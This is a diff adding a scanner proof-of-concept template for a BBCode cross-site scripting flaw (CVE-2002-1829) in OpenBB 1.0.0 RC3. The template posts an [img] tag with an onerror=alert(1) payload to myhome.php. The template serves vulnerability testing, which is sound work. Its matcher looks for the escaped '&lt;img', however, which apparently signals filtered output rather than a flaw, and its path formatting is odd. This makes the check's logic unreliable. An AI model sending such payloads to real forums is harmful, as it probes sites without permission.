@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "验证 OpenBB 1.0.0 RC3 codeparse.php 中的跨站脚本漏洞。通过向 myhome.php 提交含 [img] BBCode 的 onerror 事件载荷，检测 BBCode 解析器是否未过滤 HTML 事件属性。"
+id = "POC-AVE-2002-0703"
+name = "OpenBB 1.0.0 RC3 BBCode XSS PoC"
+severity = "medium"
+tags = ["ave-2002-0703"]
+vuln_id = [
+    "CVE-2002-1829",
+    "AVE-2002-0703",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/myhome.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=newtopic&subject=Test&message=[img]http://invalid.example/ onerror=alert(1)[/img]"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE-PoC/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "&lt;img",
+    "onerror",
+    "alert",
+]
